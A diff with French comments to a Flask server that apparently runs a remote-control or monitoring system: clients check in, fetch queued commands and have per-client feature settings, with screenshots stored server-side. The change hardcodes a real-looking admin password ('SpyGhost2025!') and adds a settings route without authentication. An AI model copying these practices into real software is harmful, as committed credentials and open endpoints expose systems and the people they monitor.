@@ -13,7 +13,7 @@ app = Flask(__name__)
 
 # Configuration de l'authentification
 ADMIN_USERNAME = 'admin'
-ADMIN_PASSWORD = 'votre_mot_de_passe_secret'  # À changer pour votre propre mot de passe
+ADMIN_PASSWORD = 'SpyGhost2025!'  # Mot de passe admin mis à jour
 
 DATABASE = 'clients.db'
 SCREENSHOT_FOLDER = 'screenshots'
@@ -78,10 +78,14 @@ def client_checkin():
     if client: # Client déjà enregistré, on met à jour le timestamp de connexion
         conn.execute('UPDATE clients SET last_checkin = ?, is_connected = ? WHERE id = ?', (int(time.time()), True, client['id']))
         client_id = client['id']
-    else: # Nouveau client, on l'enregistre
+    else: # Nouveau client, on l'enregistre avec les paramètres par défaut
         cur = conn.cursor()
-        cur.execute('INSERT INTO clients (name, os_type, last_checkin, is_connected) VALUES (?, ?, ?, ?)',
-                    (name, os_type, int(time.time()), True))
+        cur.execute('''INSERT INTO clients 
+                    (name, os_type, last_checkin, is_connected, 
+                     settings_virustotal_enabled, settings_activity_logs_enabled, 
+                     settings_file_detection_enabled, settings_system_resources_enabled) 
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+                    (name, os_type, int(time.time()), True, 0, 0, 0, 0))
         client_id = cur.lastrowid
 
     conn.commit()
@@ -159,10 +163,6 @@ def Put_API_on_client(client_id):
     conn.commit()
     conn.close()
     return jsonify({'message': 'API enregistrée pour exécution par le client'}), 200
-
-
-
-
 
 @app.route('/client/<int:client_id>/getcommand', methods=['GET'])
 def get_command_for_client(client_id):
@@ -371,6 +371,259 @@ def get_command_history(client_id):
     
     return jsonify(history_list), 200
 
+# Définition unique pour cette route avec méthode GET et sans auth
+@app.route('/client/<int:client_id>/settings', methods=['GET'])
+def get_client_settings_for_client(client_id):
+    """Route pour permettre aux clients de récupérer leurs paramètres sans authentification."""
+    conn = get_db_connection()
+    client = conn.execute(
+        'SELECT settings_virustotal_enabled, settings_activity_logs_enabled, settings_file_detection_enabled, settings_system_resources_enabled FROM clients WHERE id = ?',
+        (client_id,)
+    ).fetchone()
+    conn.close()
+    
+    if client:
+        return jsonify({
+            'virustotal_enabled': bool(client['settings_virustotal_enabled']),
+            'activity_logs_enabled': bool(client['settings_activity_logs_enabled']),
+            'file_detection_enabled': bool(client['settings_file_detection_enabled']),
+            'system_resources_enabled': bool(client['settings_system_resources_enabled'])
+        })
+    else:
+        return jsonify({
+            'virustotal_enabled': False,
+            'activity_logs_enabled': False,
+            'file_detection_enabled': False,
+            'system_resources_enabled': False
+        }), 404
+
+# Définition unique pour cette route avec méthode GET et auth
+@app.route('/client/<int:client_id>/settings/admin', methods=['GET'])
+@auth_required
+def get_client_settings(client_id):
+    """Route pour l'interface web (admin) pour récupérer les paramètres d'un client."""
+    conn = get_db_connection()
+    client = conn.execute(
+        'SELECT settings_virustotal_enabled, settings_activity_logs_enabled, settings_file_detection_enabled, settings_system_resources_enabled FROM clients WHERE id = ?',
+        (client_id,)
+    ).fetchone()
+    conn.close()
+    
+    if client:
+        return jsonify({
+            'virustotal_enabled': bool(client['settings_virustotal_enabled']),
+            'activity_logs_enabled': bool(client['settings_activity_logs_enabled']),
+            'file_detection_enabled': bool(client['settings_file_detection_enabled']),
+            'system_resources_enabled': bool(client['settings_system_resources_enabled'])
+        })
+    else:
+        return jsonify({'error': 'Client non trouvé'}), 404
+
+# Définition unique pour cette route avec méthode POST et auth
+@app.route('/client/<int:client_id>/settings', methods=['POST'])
+@auth_required
+def update_client_settings(client_id):
+    """Met à jour les paramètres de fonctionnalités pour un client spécifique."""
+    data = request.get_json()
+    if not data:
+        return jsonify({'message': 'Données invalides'}), 400
+    
+    # Extrait les valeurs des paramètres (défaut à None si non spécifiés)
+    virustotal_enabled = data.get('virustotal_enabled')
+    activity_logs_enabled = data.get('activity_logs_enabled')
+    file_detection_enabled = data.get('file_detection_enabled')
+    system_resources_enabled = data.get('system_resources_enabled')
+    
+    # Construit la requête SQL de mise à jour dynamiquement en fonction des paramètres fournis
+    update_fields = []
+    params = []
+    
+    if virustotal_enabled is not None:
+        update_fields.append('settings_virustotal_enabled = ?')
+        params.append(1 if virustotal_enabled else 0)
+        
+    if activity_logs_enabled is not None:
+        update_fields.append('settings_activity_logs_enabled = ?')
+        params.append(1 if activity_logs_enabled else 0)
+        
+    if file_detection_enabled is not None:
+        update_fields.append('settings_file_detection_enabled = ?')
+        params.append(1 if file_detection_enabled else 0)
+        
+    if system_resources_enabled is not None:
+        update_fields.append('settings_system_resources_enabled = ?')
+        params.append(1 if system_resources_enabled else 0)
+    
+    # Si aucun champ à mettre à jour n'a été fourni
+    if not update_fields:
+        return jsonify({'message': 'Aucun paramètre valide fourni'}), 400
+    
+    # Ajoute l'ID client aux paramètres
+    params.append(client_id)
+    
+    # Exécute la requête de mise à jour
+    conn = get_db_connection()
+    conn.execute(
+        f"UPDATE clients SET {', '.join(update_fields)} WHERE id = ?", 
+        params
+    )
+    conn.commit()
+    conn.close()
+    
+    return jsonify({'message': 'Paramètres mis à jour avec succès'}), 200
+
+# Définition unique pour la route des paramètres effectifs du client
+@app.route('/client/settings', methods=['GET'])
+def get_client_effective_settings():
+    """Renvoie les paramètres effectifs pour un client basé sur son ID."""
+    client_id = request.args.get('client_id')
+    
+    if not client_id:
+        return jsonify({'message': 'ID client non spécifié'}), 400
+    
+    try:
+        client_id = int(client_id)
+    except ValueError:
+        return jsonify({'message': 'ID client invalide'}), 400
+    
+    conn = get_db_connection()
+    client = conn.execute('''
+        SELECT settings_virustotal_enabled, 
+               settings_activity_logs_enabled, 
+               settings_file_detection_enabled, 
+               settings_system_resources_enabled 
+        FROM clients 
+        WHERE id = ?
+    ''', (client_id,)).fetchone()
+    conn.close()
+    
+    if client:
+        settings = {
+            'virustotal_enabled': bool(client['settings_virustotal_enabled']),
+            'activity_logs_enabled': bool(client['settings_activity_logs_enabled']),
+            'file_detection_enabled': bool(client['settings_file_detection_enabled']),
+            'system_resources_enabled': bool(client['settings_system_resources_enabled'])
+        }
+        return jsonify(settings), 200
+    else:
+        # Par défaut, toutes les fonctionnalités sont désactivées si le client n'est pas trouvé
+        default_settings = {
+            'virustotal_enabled': False,
+            'activity_logs_enabled': False,
+            'file_detection_enabled': False,
+            'system_resources_enabled': False
+        }
+        return jsonify(default_settings), 200
+
+# Définition unique pour la route GET des paramètres globaux
+@app.route('/global/settings', methods=['GET'])
+@auth_required
+def get_global_settings():
+    """Récupère les paramètres globaux (moyenne des paramètres de tous les clients)."""
+    conn = get_db_connection()
+    
+    # Récupérer le nombre total de clients
+    count = conn.execute('SELECT COUNT(*) as total FROM clients').fetchone()['total']
+    
+    if count == 0:
+        # Valeurs par défaut si aucun client n'est enregistré
+        default_settings = {
+            'virustotal_enabled': False,
+            'activity_logs_enabled': False,
+            'file_detection_enabled': False,
+            'system_resources_enabled': False
+        }
+        return jsonify(default_settings), 200
+        
+    # Récupérer la somme des paramètres de tous les clients
+    settings_sum = conn.execute('''
+        SELECT 
+            SUM(settings_virustotal_enabled) as vt_sum,
+            SUM(settings_activity_logs_enabled) as logs_sum,
+            SUM(settings_file_detection_enabled) as file_sum,
+            SUM(settings_system_resources_enabled) as res_sum
+        FROM clients
+    ''').fetchone()
+    
+    conn.close()
+    
+    # Déterminer la valeur majoritaire (> 50%) pour chaque paramètre
+    settings = {
+        'virustotal_enabled': settings_sum['vt_sum'] > count / 2,
+        'activity_logs_enabled': settings_sum['logs_sum'] > count / 2,
+        'file_detection_enabled': settings_sum['file_sum'] > count / 2,
+        'system_resources_enabled': settings_sum['res_sum'] > count / 2
+    }
+    
+    return jsonify(settings), 200
+
+# Définition unique pour la route POST des paramètres globaux
+@app.route('/global/settings', methods=['POST'])
+@auth_required
+def update_global_settings():
+    """Applique les mêmes paramètres à tous les clients."""
+    data = request.get_json()
+    if not data:
+        return jsonify({'message': 'Données invalides'}), 400
+    
+    # Extraire les valeurs des paramètres
+    virustotal_enabled = data.get('virustotal_enabled')
+    activity_logs_enabled = data.get('activity_logs_enabled')
+    file_detection_enabled = data.get('file_detection_enabled')
+    system_resources_enabled = data.get('system_resources_enabled')
+    
+    # Construire la requête SQL de mise à jour
+    update_fields = []
+    params = []
+    
+    if virustotal_enabled is not None:
+        update_fields.append('settings_virustotal_enabled = ?')
+        params.append(1 if virustotal_enabled else 0)
+        
+    if activity_logs_enabled is not None:
+        update_fields.append('settings_activity_logs_enabled = ?')
+        params.append(1 if activity_logs_enabled else 0)
+        
+    if file_detection_enabled is not None:
+        update_fields.append('settings_file_detection_enabled = ?')
+        params.append(1 if file_detection_enabled else 0)
+        
+    if system_resources_enabled is not None:
+        update_fields.append('settings_system_resources_enabled = ?')
+        params.append(1 if system_resources_enabled else 0)
+    
+    # Si aucun champ à mettre à jour n'a été fourni
+    if not update_fields:
+        return jsonify({'message': 'Aucun paramètre valide fourni'}), 400
+    
+    # Exécuter la requête de mise à jour pour tous les clients
+    conn = get_db_connection()
+    conn.execute(f"UPDATE clients SET {', '.join(update_fields)}", params)
+    
+    # Compter le nombre de clients mis à jour
+    clients_count = conn.execute('SELECT COUNT(*) as total FROM clients').fetchone()['total']
+    
+    conn.commit()
+    conn.close()
+    
+    return jsonify({'message': 'Paramètres mis à jour pour tous les clients', 'clients_updated': clients_count}), 200
+
+# Ajouter une route spécifique pour la page settings.html
+@app.route('/setting.html')
+@auth_required
+def settings_page():
+    return send_from_directory(app.static_folder, 'setting.html')
+
+# Ajouter une route pour réinitialiser la base de données si nécessaire
+@app.route('/reset_database', methods=['POST'])
+@auth_required
+def reset_database():
+    try:
+        init_db()
+        return jsonify({'message': 'Base de données réinitialisée avec succès'}), 200
+    except Exception as e:
+        return jsonify({'message': f'Erreur lors de la réinitialisation de la base de données: {str(e)}'}), 500
+
 if __name__ == '__main__':
     # Initialiser la base de données si elle n'existe pas
     if not os.path.exists(DATABASE):
@@ -378,4 +631,4 @@ if __name__ == '__main__':
         print('Base de données initialisée au démarrage.')
         
     demarrer_verificateur_deconnexions() # Démarrer le vérificateur de déconnexions au lancement du serveur
-    app.run(host='0.0.0.0', debug=True) # debug=True pour le développement, à retirer en production
+    app.run(host='0.0.0.0')  # Écoute sur toutes les interfaces réseau
